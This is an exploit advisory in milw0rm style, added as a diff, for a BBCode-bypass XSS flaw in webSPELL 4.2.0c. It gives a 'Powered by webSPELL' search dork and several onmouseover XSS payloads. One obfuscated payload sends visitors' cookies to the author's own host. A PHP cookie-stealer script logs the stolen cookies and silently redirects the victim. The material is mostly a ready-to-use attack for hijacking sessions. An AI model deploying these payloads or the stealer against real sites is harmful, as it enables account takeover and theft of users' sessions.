@@ -1,0 +1,121 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   XSS (BYPASS BBCODE) COOKIES STEALING VULNERABILITY                        |
+|--------------------------------------------------------------------------------------------|
+|                         	     | webSPELL 4.2.0c |		 		     |
+|  CMS INFORMATION:		      ----------------					     |
+|											     |
+|-->WEB: http://www.webspell.org/ (affected too)				   	     |
+|-->DOWNLOAD: http://www.webspell.org/download.php?fileID=22	   			     |
+|-->DEMO: http://www.webspell.org/index.php?site=demo					     |
+|-->CATEGORY: CMS / Portals								     |
+|-->DESCRIPTION: webSPELL is a free Content Management System (CMS) for clans and 	     |
+|   gaming communities, providing all needed features like forums, gallery, clanwar...	     |
+|                                                                                            |
+|   CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3.0.8 and IE 6.0.29 (Default)					     |
+|-->DORK: "Powered by webSPELL"								     |
+|-->CATEGORY: XSS/BYPASS-BBCODE/COOKIES STEALING					     |
+|-->AFFECT VERSION: LAST = 4.2.0C (maybe <= ?)						     |
+|-->Discovered Bug date: 2009-04-14							     |
+|-->Reported Bug date: 2009-04-14							     |
+|-->Fixed bug date: 2009-04-14								     |
+|-->Info patch (v-4.2.0d): http://www.webspell.org/					     |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
+----------------------------------------------------------------------------------------------
+
+
+-----------
+BUG ZONES:
+-----------
+
+#BBCode is bypassed by differents methods and XSS is possible.
+
+----------------------------------
+PROOF OF CONCEPT (SEARCHING XSS):
+----------------------------------
+
+BOTH (FIREFOX AND IE):
+
+
+[email][img]http://a.com onmouseover=alert(1) [/img][/email]
+[email][email][img]http://a.com onmouseover=alert(1) [/img] [/email][/email]
+[email][url][img]http://a.com onmouseover=alert(1) [/img] [/url][/email]
+
+Maybe you find more...I looked for a bit xD
+
+ONLY IE:
+
+[email][email][url]http://a.com onmouseover=alert(1) [/url]http://' onmouseover=alert(1) [/email][/email]
+[email][email][url]http://a.com' onmouseover=alert(1) [/url]http:// onmouseover=alert(1) [/email][/email]
+[email][email][url]http://a.com' onmouseover=alert(1) [/url]http:// ' onmouseover=alert(1) [/email][/email]
+[email][email][url]http://a.com' onmouseover=alert(1) [/url] ' onmouseover=alert(1) [/email][/email]
+[email][email][url]http://a.com onmouseover=alert(1) [/url] ' onmouseover=alert(1) [/email][/email]
+
+Note:Space between "(1)" and "[/img]" sometimes is necessary...
+
+Combinations of tags like this: 
+
+[email][img]http://a.com onmouseover=alert(1) [/img][/email]
+
+Generate the follow html code:
+
+<a href="mailto:..."><img src=\"http://a.com onmouseover=alert(1) \" id=\"ws_image_123966998343_1\" border=\"0\" onload=\"checkSize('123966998343_1', 450, 500)\" alt=\"http://a.com onmouseover=alert(1) \" style=\"max-width: 451px; max-height: 501px;\" /><div id=\"ws_imagediv_123966998343_1\" style=\"display:none;\"><a href='http://a.com onmouseover=alert(1) ' target='_blank'><i>(Auto resize: show original)</i></a></div></a>
+
+
+--------------------------
+COOKIES EXPLOIT (BBCODE):
+--------------------------
+
+I'll use the first PoC (IE6 and firefox) and String.fromCharCode 
+to bypass quotes and send cookies to my host:
+
+http://www.myphpcookiestealing.es/capturethecookies.php?ck=
+
+Well...Let's GO!
+
+[email][img]http://www.victim.es onmouseover=document.location=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,109,121,112,104,112,99,111,111,107,105,101,115,116,101,97,108,105,110,103,46,101,115,47,99,97,112,116,117,114,101,116,104,101,99,111,111,107,105,101,115,46,112,104,112,63,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,61)+document.cookie [/img][/email]
+
+------------------------------
+COOKIES STEALER (PHP SCRIPT):
+------------------------------
+
+<?php
+$ck=$_GET["ck"]; //Capture the cookies	 
+$manejador=fopen("exploited.txt",'a'); //Open cookies saved file
+fwrite($manejador, "Cookie:\r\n".htmlentities($ck)."\r\n--EOF--\r\n"); //Save the values
+fclose($manejador);	//Close file
+echo "<script>location.href='http://[HOST]/[PATH]/index.php?module';</script>"; //Redirect...we don't want to alert xDD
+?>
+
+You can use any cookie editor and you have one nice shot (XSSSHEll+XSSTunnel = many nice shots xD)
+
+*******************************************************************
+ ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
+*******************************************************************
+
+-------------------EOF---------------------------------->>>ENJOY IT!
+
+# milw0rm.com [2009-04-16]
